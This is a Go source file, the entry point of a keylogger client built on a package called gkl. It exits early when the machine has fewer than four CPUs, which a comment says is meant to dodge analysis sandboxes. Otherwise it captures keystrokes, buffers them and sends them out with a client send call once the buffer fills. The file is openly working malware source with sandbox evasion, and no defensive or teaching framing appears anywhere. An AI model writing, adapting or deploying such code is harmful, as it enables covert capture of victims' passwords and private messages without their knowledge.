package main

import (
	"fmt"

	"github.com/Spriithy/gkl/client"
	"github.com/Spriithy/gkl/client/keylogger"
)

func main() {
	// Sandbox might not have this many CPUs...
	if client.SysInfo.CpuCount < 4 {
		return
	}

	fmt.Println(client.SysInfo.String())

	keystrokes := make(chan string)
	kl := keylogger.NewKeylogger(keystrokes)

	go kl.Decoder.Listen()
	go func() {
		var buf string
		for keystroke := range keystrokes {
			if len(buf) > client.MAX_BUF_SIZE {
				client.Send(buf)
				buf = ""
			} else {
				buf += keystroke
			}
		}
	}()

	kl.Start()
}
